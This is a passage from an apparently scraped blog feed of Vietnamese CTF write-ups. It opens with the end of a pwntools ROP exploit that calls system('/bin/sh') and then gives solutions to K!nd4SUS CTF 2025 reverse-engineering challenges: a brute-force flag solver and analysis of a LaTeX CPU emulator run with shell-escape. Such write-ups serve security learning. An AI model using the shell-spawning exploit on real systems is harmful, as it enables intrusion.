</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]<span style="color:#f92672">+</span>libc_base
</span></span><span style="display:flex;"><span>binsh<span style="color:#f92672">=</span>libc_base<span style="color:#f92672">+</span>next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>))
</span></span><span style="display:flex;"><span>pop_rdi<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0000000000400793</span>
</span></span><span style="display:flex;"><span>ret<span style="color:#f92672">=</span>pop_rdi<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#ae81ff">0x30</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x601200</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">3</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span>p64(pop_rdi)<span style="color:#f92672">+</span>p64(binsh)
</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span>p64(ret)
</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span>p64(system)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;Insert prompt here&gt;: &#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div>]]></description>
</item>
<item>
    <title>K!nd4SUS CTF 2025</title>
    <link>https://cr0nica1.github.io/posts/intro/</link>
    <pubDate>Wed, 16 Apr 2025 02:31:48 &#43;0700</pubDate>
    <author>cr0nica1</author>
    <guid>https://cr0nica1.github.io/posts/intro/</guid>
    <description><![CDATA[<p>ƒê√¢y l√† gi·∫£i CTF ƒë·∫ßu ti√™n c·ªßa m√¨nh v·ªõi CLB BKSEC, tuy v·∫´n ch∆∞a c√≥ nhi·ªÅu kinh nghi·ªám nh∆∞ng m√¨nh c≈©ng h·ªçc h·ªèi kh√° nhi·ªÅu ƒëi·ªÅu t·ª´ 2 challenge m√¨nh gi·∫£i ƒë∆∞·ª£c.</p>
<h2 id="i-the-kindling-of-the-first-flag---reverse-engineering">I. The kindling of the first Flag - reverse engineering</h2>
<h3 id="1-analysis">1. Analysis</h3>
<p>Chall l√† m·ªôt file python v·ªÅ m·ªôt tr√≤ ch∆°i t√¨m path th·ªèa m√£n ƒë·ªÉ ch∆∞∆°ng tr√¨nh in ra flag.</p>
<pre tabindex="0"><code>import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os
import base64
import random

FLAG = &#34;JlLScp2qTzfFZ7kIYP6Jm5Mv/2h6p26S0OWgmXYdEMAl1Sjg6hwW95bPsZdtiggvHVVv8zM+x7vRw2qOr3ORbw==&#34;
RED = &#34;\033[0;31m&#34;
PURPLE = &#34;\033[0;35m&#34;
ITALIC = &#34;\033[3m&#34;
BOLD = &#34;\033[1m&#34;
UNDERLINE = &#34;\033[4m&#34;
END = &#34;\033[0m&#34;

# don&#39;t mind the crypto stuff
class Cipher:
    def encrypt(self, plainText, key):
        iv = os.urandom(16) 
        privateKey = hashlib.sha256(key.encode(&#34;utf-8&#34;)).digest() 
        cipher = AES.new(privateKey, AES.MODE_CBC, iv)
        encryptedBytes = cipher.encrypt(pad(plainText.encode(), AES.block_size))  
        return base64.b64encode(iv + encryptedBytes).decode()

    def decrypt(self, encrypted, key):
        encryptedData = base64.b64decode(encrypted) 
        iv = encryptedData[:16] 
        privateKey = hashlib.sha256(key.encode(&#34;utf-8&#34;)).digest()  
        cipher = AES.new(privateKey, AES.MODE_CBC, iv) 
        try:
            decryptedBytes = unpad(cipher.decrypt(encryptedData[16:]), AES.block_size)  
        except:
            die(1)
        return decryptedBytes.decode()


places = [&#34;Cemetery of Ash&#34;, &#34;Grand Archives&#34;, &#34;Profaned Capital&#34;, &#34;Farron Keep&#34;, &#34;Anor Londo&#34;, &#34;High Wall of Lothric&#34;, &#34;Undead Settlement&#34;, &#34;Firelink Shrine&#34;, &#34;Road of Sacrifices&#34;, &#34;Irithyll Dungeon&#34;, &#34;Catacombs of Carthus&#34;, &#34;Lothric Castle&#34;, &#34;Cathedral of the Deep&#34;,&#34;Irithyll of the Boreal Valley&#34;,&#34;Untended Graves&#34;,&#34;Kiln of the First Flame&#34;]

routes = [
    [60, &#34;Firelink Shrine&#34;, &#34;Kiln of the First Flame&#34;, &#34;Undead Settlement&#34;, &#34;High Wall of Lothric&#34;],
    [-10, &#34;Lothric Castle&#34;, &#34;High Wall of Lothric&#34;, &#34;Irithyll of the Boreal Valley&#34;, &#34;Untended Graves&#34;],
    [12, &#34;Irithyll Dungeon&#34;, &#34;Grand Archives&#34;, &#34;Undead Settlement&#34;, &#34;Kiln of the First Flame&#34;],
    [-5555, &#34;Road of Sacrifices&#34;, &#34;Catacombs of Carthus&#34;, &#34;Anor Londo&#34;, &#34;Cathedral of the Deep&#34;],
    [555, &#34;Irithyll of the Boreal Valley&#34;, &#34;Irithyll Dungeon&#34;, &#34;High Wall of Lothric&#34;, &#34;Cemetery of Ash&#34;],
    [3, &#34;Firelink Shrine&#34;, &#34;Undead Settlement&#34;, &#34;Lothric Castle&#34;, &#34;Untended Graves&#34;],
    [1015, &#34;High Wall of Lothric&#34;, &#34;Road of Sacrifices&#34;, &#34;Irithyll Dungeon&#34;, &#34;Grand Archives&#34;],
    [35, &#34;Kiln of the First Flame&#34;, &#34;High Wall of Lothric&#34;, &#34;Cemetery of Ash&#34;, &#34;Irithyll of the Boreal Valley&#34;],
    [143, &#34;Cathedral of the Deep&#34;, &#34;Farron Keep&#34;, &#34;Undead Settlement&#34;, &#34;Lothric Castle&#34;],
    [1551, &#34;Irithyll of the Boreal Valley&#34;, &#34;Profaned Capital&#34;, &#34;High Wall of Lothric&#34;, &#34;Farron Keep&#34;],
    [70, &#34;Farron Keep&#34;, &#34;Irithyll of the Boreal Valley&#34;, &#34;Grand Archives&#34;, &#34;Firelink Shrine&#34;],
    [77, &#34;High Wall of Lothric&#34;, &#34;Untended Graves&#34;, &#34;Grand Archives&#34;, &#34;Farron Keep&#34;],
    [718640, &#34;Farron Keep&#34;, &#34;Road of Sacrifices&#34;, &#34;Profaned Capital&#34;, &#34;Anor Londo&#34;],
    [869, &#34;Anor Londo&#34;, &#34;Irithyll Dungeon&#34;, &#34;Catacombs of Carthus&#34;, &#34;Road of Sacrifices&#34;],
    [6969, &#34;Lothric Castle&#34;, &#34;High Wall of Lothric&#34;, &#34;Kiln of the First Flame&#34;, &#34;Cathedral of the Deep&#34;]
]

position = &#34;&#34;
path = []

def checkFlag():
    global path
    aes = Cipher()

    a = &#34;&#34; 
    b = &#34;&#34;
    for p in path:
        if path.index(p) % 2 == 0:
            a += f&#34;{p[0]+p[-1]}&#34;
        else:
            b += f&#34;{p[0]+p[-1]}&#34;

    key = a+b
    attempt = aes.decrypt(FLAG,key)

    if &#34;KSUS&#34; not in attempt:
        die(1)
    else:
        print(f&#34;\nYou hear that sweet female voice again, this time clearer.\n{ITALIC}Well done, Unflagged...{END}, she muses as a torn piece of parchment manifests itself in front of you:&#34;)
        print(f&#34;{PURPLE}{attempt}{END}&#34;)
        exit()


def printLocationDetails():
    global position
    print(f&#34;\nYou find yourself in a place called {PURPLE}{BOLD}{position.upper()}{END}.&#34;)
    print(&#34;A number of dangerous paths, crawling with enemies, open in front of you... An infinite sea of possibilities.\nWhere will you go?\n&#34;)
    for i,r in enumerate(routes[places.index(position)][1:]):
        print(f&#34;\t{i}. {r}&#34;)


def die(way):
    quotes = [
        f&#34;As you make your next step, you waste a second to glance at the bloodied path you are about to leave behind. \nOne second too long, as a blazing sword piercing right through you suddenly reminds you. \n{ITALIC}This spot marks our grave, but you may rest here too, if you would like...{END} a young prince whispers.&#34;,
        f&#34;The earth trembles and you feel the sudden urge to look to the greyish sky above you.\n{ITALIC}Ignorant slaves, how quickly you forget{END}, a twisted dragon-man spits as he crushes you under his feet.&#34;,
        f&#34;The deadly scythe of a woman grabs you by the waist.\n{ITALIC}Return from whence thou cam&#39;st. For that is thy place of belonging{END}, the Sister commands before taking you to your grave.&#34;,
        f&#34;In the thick mist, a nun-like figure reveals herself in front of you.\n{ITALIC}Return Lord of Londor. You have your own subjects to attain to{END}, she whispers as she cuts right through you with her scythe.&#34;
    ]
    if way:
        print(f&#34;\n{random.choice(quotes)}&#34;)
    else:
        print(f&#34;{ITALIC}What is taking you so long?{END}, Patches croons before kicking you off a cliff again.&#34;)

    print(f&#34;\n\t{RED}YOU DIED{END}\n&#34;)
    exit()


def proceed(next):
    global position
    if sum([0, 0, 0, 1][routes[places.index(position)][0]:routes[places.index(position)][0]+1]) == 1:
        if next &gt; ((221^216)&gt;&gt;True)*((len(&#34;...Rise, if you would...for that is our curse...&#34;)^53)&gt;&gt;1):
            die(1)
    elif sum(int(d) for d in str(abs(routes[places.index(position)][0]))) % 3 == 0:   
        if next &gt; (int(bool(len(&#34;Why, Patches, why?&#34;)))):
            die(1)
    elif str(abs(routes[places.index(position)][0]))[-1] in &#34;05&#34;:  
        if next &gt; (True &lt;&lt; True):
            die(1)
    elif (sum(int(str(routes[places.index(position)][0])[i]) for i in range(0, len(str(routes[places.index(position)][0])), 2)) - sum(int(str(routes[places.index(position)][0])[i]) for i in range(1, len(str(routes[places.index(position)][0])), 2))) % 11 == 0: 
        if next &gt; (sum(map(int,str(111111)[::2]))):
            die(1)

    path.append(routes[places.index(position)][next])   
    position = routes[places.index(position)][next]
        

def play():
    global position
    global path
    while True:
        if position != &#34;Kiln of the First Flame&#34; and len(path) &lt; 22: 
            printLocationDetails() 
            next = int(input(&#34;\nChoose a number &gt;   &#34;))
            if next &lt; 0 or next &gt; 3:
                exit()
            proceed(next+1)
        elif position == &#34;Kiln of the First Flame&#34;:   
            checkFlag()
        elif len(path) &gt;= 22:
            die(0)


def main():
    global position
    print(f&#34;\n{ITALIC}You slowly rise as you are awaken by a sweet and ageless voice. \n&#39;Let the Flame guide thee in this search for the flag&#39;, she whispers softly into your ear. \nBefore you can ask any questions, she disappears. \n\nYou are now left in utter silence.{END}\n&#34;)
    print(f&#34;\t{UNDERLINE}PRESS ENTER TO CONTINUE{END}&#34;)
    input()
    position = &#34;Cemetery of Ash&#34;
    path.append(position)  
    play()


if __name__ == &#34;__main__&#34;:
    main()
    
</code></pre><p>Khi ƒë·∫°t ƒëi·ªÅu ki·ªán k·∫øt th√∫c c·ªßa path ( ƒë·∫øn v·ªã tr√≠ Kiln of the First Flame ho·∫∑c ƒë·ªô d√†i path l·ªõn h∆°n 22) th√¨ ch∆∞∆°ng tr√¨nh s·∫Ω g·ªçi check flag. ·ªû ƒë√¢y ch∆∞∆°ng tr√¨nh sinh string b·∫±ng 1 thu·∫≠t to√°n x·ª≠ l√Ω t·ª´ list path, sau ƒë√≥ ƒë∆∞a k·∫øt qu·∫£ thu ƒë∆∞·ª£c m√£ h√≥a b·∫±ng h√†m bƒÉm sha256, r·ªìi l·∫•y n√≥ l√†m key ƒë·ªÉ gi·∫£i m√£ Flag. H√†m bƒÉm sha256 l√† kh√¥ng th·ªÉ ƒë·∫£o ng∆∞·ª£c ( ho·∫∑c c√≥ th·ªÉ theo m·ªôt v√†i ph√°p s∆∞ Trung hoa tuy√™n b·ªë :v ) do v·∫≠y ph∆∞∆°ng √°n m√¨nh nghƒ© ra l√† brute force, do s·ªë ƒë∆∞·ªùng ƒëi v·∫´n ƒë·ªß nh·ªè ch·∫•p nh·∫≠n ƒë∆∞·ª£c.</p>
<h3 id="2-analyzing-constraints">2. Analyzing constraints</h3>
<p>C√°c r√†ng bu·ªôc ƒë·ªëi v·ªõi path ƒë·ªÉ path h·ª£p l·ªá n·∫±m b√™n trong h√†m proceed, ƒë∆∞·ª£c obfuscated ƒë·ªÉ kh√≥ nh·∫≠n ra h∆°n.</p>
<pre tabindex="0"><code>if sum([0, 0, 0, 1][routes[places.index(position)][0]:routes[places.index(position)][0]+1]) == 1:
    if next &gt; ((221^216)&gt;&gt;True)*((len(&#34;...Rise, if you would...for that is our curse...&#34;)^53)&gt;&gt;1):
            die(1)
elif sum(int(d) for d in str(abs(routes[places.index(position)][0]))) % 3 == 0:   
    if next &gt; (int(bool(len(&#34;Why, Patches, why?&#34;)))):
            die(1)
elif str(abs(routes[places.index(position)][0]))[-1] in &#34;05&#34;:  
    if next &gt; (True &lt;&lt; True):
            die(1)
elif (sum(int(str(routes[places.index(position)][0])[i]) for i in range(0, len(str(routes[places.index(position)][0])), 2)) - sum(int(str(routes[places.index(position)][0])[i]) for i in range(1, len(str(routes[places.index(position)][0])), 2))) % 11 == 0: 
    if next &gt; (sum(map(int,str(111111)[::2]))):
            die(1)
</code></pre><p>ƒêi v√†o ph√¢n t√≠ch t·ª´ng r√†ng bu·ªôc m·ªôt, m√¨nh s·∫Ω vi·∫øt l·∫°i c√°c r√†ng bu·ªôc ƒë·ªÉ d·ªÖ nh√¨n h∆°n. M√¨nh s·∫Ω ƒë·∫∑t key = routes[places.index(position)][0].</p>
<pre tabindex="0"><code>if sum([0, 0, 0, 1][routes[places.index(position)][0]:routes[places.index(position)][0]+1]) == 1:
        if next &gt; ((221^216)&gt;&gt;True)*((len(&#34;...Rise, if you would...for that is our curse...&#34;)^53)&gt;&gt;1):
            die(1)
</code></pre><p>·ªû r√†ng bu·ªôc ƒë·∫ßu ti√™n, n√≥ s·∫Ω t∆∞∆°ng ƒë∆∞∆°ng v·ªõi:</p>
<pre tabindex="0"><code>if key == 3:
        Max_choice=4
</code></pre><p>ƒêi·ªÅu ƒë√≥ c√≥ nghƒ©a l√† ng∆∞·ªùi ch∆°i s·∫Ω ƒë∆∞·ª£c ch·ªçn b∆∞·ªõc ti·∫øp theo l√† [0,1,2,3]. T∆∞∆°ng t·ª± v·ªõi 3 r√†ng bu·ªôc c√≤n l·∫°i.</p>
<pre tabindex="0"><code>elif sum(int(d) for d in str(abs(key))) % 3 == 0:
        Max_choice=1
        
elif str(abs(key))[-1] in &#34;05&#34;:
        Max_choice=2
elif:
        even_sum = sum(int(d) for d in str(abs(key))[::2])
        odd_sum = sum(int(d) for d in str(abs(key))[1::2])
        if (even_sum - odd_sum) % 11 == 0:
            Max_choce=3

Max_choice =0
</code></pre><h3 id="3-brute-force">3. Brute force</h3>
<pre tabindex="0"><code>import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os
import base64
import random
from collections import deque
FLAG = &#34;JlLScp2qTzfFZ7kIYP6Jm5Mv/2h6p26S0OWgmXYdEMAl1Sjg6hwW95bPsZdtiggvHVVv8zM+x7vRw2qOr3ORbw==&#34;
RED = &#34;\033[0;31m&#34;
PURPLE = &#34;\033[0;35m&#34;
ITALIC = &#34;\033[3m&#34;
BOLD = &#34;\033[1m&#34;
UNDERLINE = &#34;\033[4m&#34;
END = &#34;\033[0m&#34;


class Cipher:
    def encrypt(self, plainText, key):
        iv = os.urandom(16) 
        privateKey = hashlib.sha256(key.encode(&#34;utf-8&#34;)).digest() 
        cipher = AES.new(privateKey, AES.MODE_CBC, iv)
        encryptedBytes = cipher.encrypt(pad(plainText.encode(), AES.block_size))  
        return base64.b64encode(iv + encryptedBytes).decode()

    def decrypt(self, encrypted, key):
        encryptedData = base64.b64decode(encrypted) 
        iv = encryptedData[:16] 
        privateKey = hashlib.sha256(key.encode(&#34;utf-8&#34;)).digest()  
        cipher = AES.new(privateKey, AES.MODE_CBC, iv) 
        try:
            decryptedBytes = unpad(cipher.decrypt(encryptedData[16:]), AES.block_size)  
        except:
            return &#39;&#39;
        return decryptedBytes.decode()


places = [&#34;Cemetery of Ash&#34;, &#34;Grand Archives&#34;, &#34;Profaned Capital&#34;, &#34;Farron Keep&#34;, &#34;Anor Londo&#34;, &#34;High Wall of Lothric&#34;, &#34;Undead Settlement&#34;, &#34;Firelink Shrine&#34;, &#34;Road of Sacrifices&#34;, &#34;Irithyll Dungeon&#34;, &#34;Catacombs of Carthus&#34;, &#34;Lothric Castle&#34;, &#34;Cathedral of the Deep&#34;,&#34;Irithyll of the Boreal Valley&#34;,&#34;Untended Graves&#34;,&#34;Kiln of the First Flame&#34;]

routes = [
    [60, &#34;Firelink Shrine&#34;, &#34;Kiln of the First Flame&#34;, &#34;Undead Settlement&#34;, &#34;High Wall of Lothric&#34;],
    [-10, &#34;Lothric Castle&#34;, &#34;High Wall of Lothric&#34;, &#34;Irithyll of the Boreal Valley&#34;, &#34;Untended Graves&#34;],
    [12, &#34;Irithyll Dungeon&#34;, &#34;Grand Archives&#34;, &#34;Undead Settlement&#34;, &#34;Kiln of the First Flame&#34;],
    [-5555, &#34;Road of Sacrifices&#34;, &#34;Catacombs of Carthus&#34;, &#34;Anor Londo&#34;, &#34;Cathedral of the Deep&#34;],
    [555, &#34;Irithyll of the Boreal Valley&#34;, &#34;Irithyll Dungeon&#34;, &#34;High Wall of Lothric&#34;, &#34;Cemetery of Ash&#34;],
    [3, &#34;Firelink Shrine&#34;, &#34;Undead Settlement&#34;, &#34;Lothric Castle&#34;, &#34;Untended Graves&#34;],
    [1015, &#34;High Wall of Lothric&#34;, &#34;Road of Sacrifices&#34;, &#34;Irithyll Dungeon&#34;, &#34;Grand Archives&#34;],
    [35, &#34;Kiln of the First Flame&#34;, &#34;High Wall of Lothric&#34;, &#34;Cemetery of Ash&#34;, &#34;Irithyll of the Boreal Valley&#34;],
    [143, &#34;Cathedral of the Deep&#34;, &#34;Farron Keep&#34;, &#34;Undead Settlement&#34;, &#34;Lothric Castle&#34;],
    [1551, &#34;Irithyll of the Boreal Valley&#34;, &#34;Profaned Capital&#34;, &#34;High Wall of Lothric&#34;, &#34;Farron Keep&#34;],
    [70, &#34;Farron Keep&#34;, &#34;Irithyll of the Boreal Valley&#34;, &#34;Grand Archives&#34;, &#34;Firelink Shrine&#34;],
    [77, &#34;High Wall of Lothric&#34;, &#34;Untended Graves&#34;, &#34;Grand Archives&#34;, &#34;Farron Keep&#34;],
    [718640, &#34;Farron Keep&#34;, &#34;Road of Sacrifices&#34;, &#34;Profaned Capital&#34;, &#34;Anor Londo&#34;],
    [869, &#34;Anor Londo&#34;, &#34;Irithyll Dungeon&#34;, &#34;Catacombs of Carthus&#34;, &#34;Road of Sacrifices&#34;],
    [6969, &#34;Lothric Castle&#34;, &#34;High Wall of Lothric&#34;, &#34;Kiln of the First Flame&#34;, &#34;Cathedral of the Deep&#34;]
]
path=[]
check=True

def checkFlag(path):
    aes = Cipher()

    a = &#34;&#34; 
    b = &#34;&#34;
    for p in path:
        if path.index(p) % 2 == 0:
            a += f&#34;{p[0]+p[-1]}&#34;
        else:
            b += f&#34;{p[0]+p[-1]}&#34;

    key = a + b
    #print(f&#34;Testing path: {&#39; -&gt; &#39;.join(path)}&#34;) 
    #print(f&#34;Generated key: {key}&#34;) 

    try:
        attempt = aes.decrypt(FLAG, key)
        if attempt and &#34;KSUS&#34; in attempt:
            print(f&#34;\nYou hear that sweet female voice again, this time clearer.\n{ITALIC}Well done, Unflagged...{END}, she muses as a torn piece of parchment manifests itself in front of you:&#34;)
            print(f&#34;{PURPLE}{attempt}{END}&#34;)
            return True  
    except Exception as e:
        pass
    
    return False  

def die(way):
    quotes = [
        f&#34;As you make your next step, you waste a second to glance at the bloodied path you are about to leave behind. \nOne second too long, as a blazing sword piercing right through you suddenly reminds you. \n{ITALIC}This spot marks our grave, but you may rest here too, if you would like...{END} a young prince whispers.&#34;,
        f&#34;The earth trembles and you feel the sudden urge to look to the greyish sky above you.\n{ITALIC}Ignorant slaves, how quickly you forget{END}, a twisted dragon-man spits as he crushes you under his feet.&#34;,
        f&#34;The deadly scythe of a woman grabs you by the waist.\n{ITALIC}Return from whence thou cam&#39;st. For that is thy place of belonging{END}, the Sister commands before taking you to your grave.&#34;,
        f&#34;In the thick mist, a nun-like figure reveals herself in front of you.\n{ITALIC}Return Lord of Londor. You have your own subjects to attain to{END}, she whispers as she cuts right through you with her scythe.&#34;
    ]
    if way:
        print(f&#34;\n{random.choice(quotes)}&#34;)
    else:
        print(f&#34;{ITALIC}What is taking you so long?{END}, Patches croons before kicking you off a cliff again.&#34;)

    print(f&#34;\n\t{RED}YOU DIED{END}\n&#34;)
    global check 
    check=False

def get_max_choice(key):
    
    if key == 3:
        return 4
    elif sum(int(d) for d in str(abs(key))) % 3 == 0:
        return 1
    elif str(abs(key))[-1] in &#34;05&#34;:
        return 2
    else:
        even_sum = sum(int(d) for d in str(abs(key))[::2])
        odd_sum = sum(int(d) for d in str(abs(key))[1::2])
        if (even_sum - odd_sum) % 11 == 0:
            return 3
    return 0  


def generate_paths(current, path, paths):
    
  
    if current == &#34;Kiln of the First Flame&#34;:
        paths.append(path)
        return

    if len(path) &gt;= 22:
        return

    try:
        idx = places.index(current)
    except ValueError:
        return
    route = routes[idx]
    key = route[0]
    max_choice = get_max_choice(key)

 
    for i in range(max_choice):
        next_place = route[i + 1]
        generate_paths(next_place, path + [next_place], paths)



all_paths = []
generate_paths(&#34;Cemetery of Ash&#34;, [&#34;Cemetery of Ash&#34;], all_paths)
for path in all_paths:
    if checkFlag(path)==True:
        exit()
</code></pre><p>M√¨nh s·∫Ω sinh t·∫•t c·∫£ c√°c path h·ª£p l·ªá d·ª±a v√†o 4 constraint r·ªìi brute force t√¨m flag.</p>
<p></p>
<h2 id="ii-turing-approved---reverse-engineering">II Turing-Approved - reverse engineering</h2>
<h3 id="1-static-analysis">1. Static Analysis</h3>
<p>Gi·∫£i n√©n Challenge th√¨ g·ªìm c√≥ 4 file l√† execution.sty, interpreted.tex, Makefile v√† RAM. ƒê·∫ßu ti√™n m√¨nh ki·ªÉm tra file Makefile.</p>
<pre tabindex="0"><code>.PHONY: run

run:
   echo &#34;&#34; &gt; DUMP
   pdflatex --shell-escape interpreted.tex &gt; /dev/null
   tr -d &#39;\n&#39; &lt; DUMP
   rm interpreted.aux interpreted.log interpreted.output
</code></pre><p>Kh√° k·ª≥ l·∫° ·ªü ƒë√¢y l√† pdflatex l·∫°i kh·ªüi ch·∫°y v·ªõi option &ndash;shell-escape, d√πng ƒë·ªÉ th·ª±c thi c√°c l·ªánh shell trong file latex.
M√¨nh s·∫Ω ki·ªÉm tra b√™n trong file latex, t·ª©c file interpreted.tex xem n√≥ th·ª±c thi c√°i g√¨.</p>
<pre tabindex="0"><code>\documentclass{article}
\usepackage[a0paper,landscape]{geometry}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%																%
%		Hi, enjoy the folly		~ S-Mancl						%
%																%
%																%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


\usepackage{execution}
\begin{document}

\pagenumbering{gobble}

\begin{titlepage}
    \pagestyle{empty}
	\begin{center}
		\scalebox{8}{
		{\LARGE Emulation of a CPU using \LaTeX}
		}
		
		\scalebox{8}{
		{\Large It&#39;s funny, isn&#39;t it?}
		}
	\end{center}
\end{titlepage}

\setup
\fetchdecodeexecwriteback
\printCPU

\end{document}
</code></pre><p>·ªû ƒë√¢y th√¨ m√¨nh nh√¨n th·∫•y title c·ªßa file pdf ƒë∆∞·ª£c xu·∫•t ra l√† &ldquo;Emulation of a CPU using \LaTeX&rdquo;, l√†m m√¨nh suy nghƒ© ƒë·∫øn √Ω t∆∞·ªüng c√≥ th·ªÉ c√°c c√¢u l·ªánh ƒë∆∞·ª£c th·ª±c thi ·ªü ƒë√¢y l√† m·ªôt ch∆∞∆°ng tr√¨nh m√¥ ph·ªèng CPU.</p>
<p>Sau khi ƒë·∫∑t xong title, ch∆∞∆°ng tr√¨nh ch·∫°y 3 l·ªánh l√† <code>\setup</code>, <code>\fetchdecodeexecwriteback</code>, v√† <code>printCPU</code>. ·ªû b√™n d∆∞·ªõi kh√¥ng c√≥ ƒë·ªãnh nghƒ©a c√°c l·ªánh n√†y n√™n c√≥ l·∫Ω n√≥ ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong 1 file kh√°c.  Sau m·ªôt th·ªùi gian research th√¨ m√¨nh bi·∫øt r·∫±ng file <code>.sty</code> l√† file c√≥ th·ªÉ d√πng ƒë·ªÉ ƒë·ªãnh nghƒ©a l·ªánh trong latex, v√¨ v·∫≠y m√¨nh s·∫Ω ƒë·ªçc file <code>execution.sty</code> xem n√≥ ƒë·ªãnh nghƒ©a 3 l·ªánh n√†y nh∆∞ th·∫ø n√†o.
M√¨nh m·ªü file n√†y ra th√¨ th·ª±c s·ª± n√≥ r·∫•t &hellip; d√†i, m√¨nh kh√¥ng th·ªÉ ƒë·ªçc to√†n b·ªô n√™n ch·ªâ search c√°c t·ª´ kh√≥a <code>\setup</code>, <code>\fetchdecodeexecwriteback</code>, v√† <code>\printCPU</code> xem c√°c l·ªánh n√†y l√†m g√¨,</p>
<p><code>\setup</code> :</p>
<pre tabindex="0"><code>\newcommand{\setup}{%
    \newwrite\myoutput
    \immediate\openout\myoutput=\jobname.output
    \lgl{Setting up everything, please be patient}

        \newcounter{lineNumber}
        \newcounter{countLetters}
    \setcounter{countLetters}{0}
        \newcounter{exit}
        \newcounter{start}
    \newcounter{end}
    \newcounter{temp}
    \newcounter{temp1}
    \newcounter{temp2}
    \newcounter{temp3}
    \newcounter{temp4}
    \newcounter{temp_}
    \newcounter{temp_1}
    \newcounter{temp_2}
    \foreach \i in {0,...,15}{
        \newcounter{tempregister_\i}
        \setcounter{tempregister_\i}{0}
    }
    \foreach \i in {0,...,15}{
        \newcounter{tempregister1_\i}
        \setcounter{tempregister1_\i}{0}
    }
        \newcounter{PC}%
        \foreach \j in {0,...,511}{
        \foreach \i in {0,...,15}{
            \newcounter{mem\j_\i}
            \setcounter{mem\j_\i}{0}
        }
    }
        \foreach \i in {0,...,7}{
        \foreach \j in {0,...,15}{
            \newcounter{R\i\j}
            \setcounter{R\i\j}{0}
        }
    }
    \foreach \i in {IR,MAR,MDR,PC}{
        \foreach \j in {0,...,15}{
            \newcounter{\i\j}
            \setcounter{\i\j}{0}
        }
    }
    \foreach \i in {0,...,2}{
        \newcounter{CC\i}
        \setcounter{CC\i}{0}
    }
    
    \setcounter{CC1}{1}
    
    \lr
}

\newcommand{\lr}{%
    \setcounter{temp}{0}
    \setcounter{temp1}{0}
    \CatchFileDef{\ramdata}{RAM}{}
    \lgl{Ready to read memory}
    \foreach \bit in \ramdata {
        \ifnum\value{temp1}&gt;15
            \stepcounter{temp}
            \setcounter{temp1}{0}
        \fi
        \ifnum \bit=1
            \setcounter{mem\arabic{temp}_\arabic{temp1}}{1}
        \fi
        \stepcounter{temp1}
    }
    \lgl{RAM loaded into emulated memory}
}
</code></pre><p><code>\fetchdecodeexecwriteback</code> :</p>
<pre tabindex="0"><code>\newcommand{\fetchdecodeexecwriteback}{%
        \setcounter{exit}{0}
    \loop
    \ti{PC}%
        \printCPU%
%
%
    \foreach \i in {0,...,15}{%
        \setcounter{IR\i}{\value{mem\arabic{PC}_\i}}%
    }%
    \immediate\write18{printf &#34;\\a&#34; 1&gt;&amp;2;}
%
    \ifnum \value{IR0}=0{
        \ifnum \value{IR1}=0{
            \ifnum \value{IR2}=0{
                \ifnum \value{IR3}=0{
                    \nxti
                    \lits{BR}
                    \pb
                }\else{
                    \lits{ADD}
                    \pa
                    \nxti
                }\fi
            }\else{
                \ifnum \value{IR3}=0{
                    \lits{LD}
                    \pl
                    \nxti
                }\else{
                    \lits{ST}
                    \ps
                    \nxti
                }\fi
            }\fi
        }\else{
            \ifnum \value{IR2}=0{
                \ifnum \value{IR3}=0{
                    \lits{JSR}
                    \pjts
                }\else{
                    \lits{AND}
                    \pan
                    \nxti
                }\fi
            }\else{
                \ifnum \value{IR3}=0{
                    \lits{LDR}
                    \plr
                    \nxti
                }\else{
                    \lits{STR}
                    \psr
                    \nxti
                }\fi
            }\fi
        }\fi
    }\else{
        \ifnum \value{IR1}=0{
            \ifnum \value{IR2}=0{
                \ifnum \value{IR3}=0{
                    \lits{RTI}
                    \prfi
                }\else{
                    \lits{NOT}
                    \pn
                    \nxti
                }\fi
            }\else{
                \ifnum \value{IR3}=0{
                    \lits{LDI}
                    \pli
                    \nxti
                }\else{
                    \lits{STI}
                    \psit
                    \nxti
                }\fi
            }\fi
        }\else{
            \ifnum \value{IR2}=0{
                \ifnum \value{IR3}=0{
                    \lits{JSSR}
                    \pjtsur
                }\else{
                    \lits{RET}
                    \pr
                    \nxti
                }\fi
            }\else{
                \ifnum \value{IR3}=0{
                    \lits{LEA}
                    \plea
                    \nxti
                }\else{
                    \lits{TRAP}
                    \pt
                }\fi
            }\fi
        }\fi
    }\fi

        
    \ifnum \value{exit}=0
    \repeat

    \lgl{Execution has ended}
    \setcounter{temp}{0}
    \setcounter{temp1}{0}
    \lgl{Ready to dump memory}
    

    \foreach \j in {0,...,511}{
        \foreach \i in {0,...,15}{
